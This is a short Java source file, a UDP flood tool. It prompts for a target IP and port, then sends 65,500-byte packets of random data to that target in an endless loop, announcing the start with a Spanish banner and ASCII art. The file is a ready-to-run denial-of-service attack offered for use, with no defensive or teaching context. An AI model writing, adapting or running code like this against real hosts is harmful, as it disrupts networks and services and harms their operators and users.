package Flood;

import java.io.IOException;
import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetAddress;
import java.net.SocketException;
import java.net.UnknownHostException;
import java.security.SecureRandom;
import java.util.Scanner;


public class UDPFlood extends Thread{
	
	public final class Colores {
	    

		  public static final String ANSI_RESET = "\u001B[0m";
		  public static final String ANSI_BLACK = "\u001B[30m";
		  public static final String ANSI_RED = "\u001B[31m";
		  public static final String ANSI_GREEN = "\u001B[32m";
		  public static final String ANSI_YELLOW = "\u001B[33m";
		  public static final String ANSI_BLUE = "\u001B[34m";
		  public static final String ANSI_PURPLE = "\u001B[35m";
		  public static final String ANSI_CYAN = "\u001B[36m";
		  public static final String ANSI_WHITE = "\u001B[37m";

	}
	
	public static void main(String[] args) throws Exception {
		
		DatagramSocket socket = null;
		InetAddress address = null;
		byte[] buffer = new byte[65500];
		SecureRandom random = new SecureRandom();
		Scanner scanner = new Scanner(System.in);
		
		System.out.println(Colores.ANSI_RED+"░░░░█▐▄▒▒▒▌▌▒▒▌░▌▒▐▐▐▒▒▐▒▒▌▒▀▄▀▄░\r\n"
				+ "░░░█▐▒▒▀▀▌░▀▀▀░░▀▀▀░░▀▀▄▌▌▐▒▒▒▌▐░\r\n"
				+ "░░▐▒▒▀▀▄▐░▀▀▄▄░░░░░░░░░░░▐▒▌▒▒▐░▌\r\n"
				+ "░░▐▒▌▒▒▒▌░▄▄▄▄█▄░░░░░░░▄▄▄▐▐▄▄▀░░\r\n"
				+ "░░▌▐▒▒▒▐░░░░░░░░░░░░░▀█▄░░░░▌▌░░░\r\n"
				+ "▄▀▒▒▌▒▒▐░░░░░░░▄░░▄░░░░░▀▀░░▌▌░░░\r\n"
				+ "▄▄▀▒▐▒▒▐░░░░░░░▐▀▀▀▄▄▀░░░░░░▌▌░░░\r\n"
				+ "░░░░█▌▒▒▌░░░░░▐▒▒▒▒▒▌░░░░░░▐▐▒▀▀▄\r\n"
				+ "░░▄▀▒▒▒▒▐░░░░░▐▒▒▒▒▐░░░░░▄█▄▒▐▒▒▒\r\n"
				+ "▄▀▒▒▒▒▒▄██▀▄▄░░▀▄▄▀░░▄▄▀█▄░█▀▒▒▒▒\n");
		
		System.out.print(Colores.ANSI_CYAN+"[ IP ] » "+ Colores.ANSI_RESET);
		String IP = scanner.nextLine();
		System.out.print("\n"+Colores.ANSI_CYAN+"[ Port ] » " + Colores.ANSI_RESET);
		int PORT = scanner.nextInt();
		
		try {
			socket = new DatagramSocket();
		} catch (SocketException e) {
			e.printStackTrace();
		}
		
		try {
			address = InetAddress.getByName(IP);
		} catch (UnknownHostException e) {
			e.printStackTrace();
		}
		
		random.nextBytes(buffer);
		DatagramPacket packet = new DatagramPacket(buffer, buffer.length, address, PORT);
		
		try {
				System.out.printf(Colores.ANSI_RED+"\n[ Violacion Iniciada ] \n\n"+Colores.ANSI_CYAN+"%s:%d\n", IP, PORT);
				
				while (true) {
					socket.send(packet); 
				}	
			
		} catch (IOException e) {
			e.printStackTrace();
		}
		
		socket.close();
	}

}
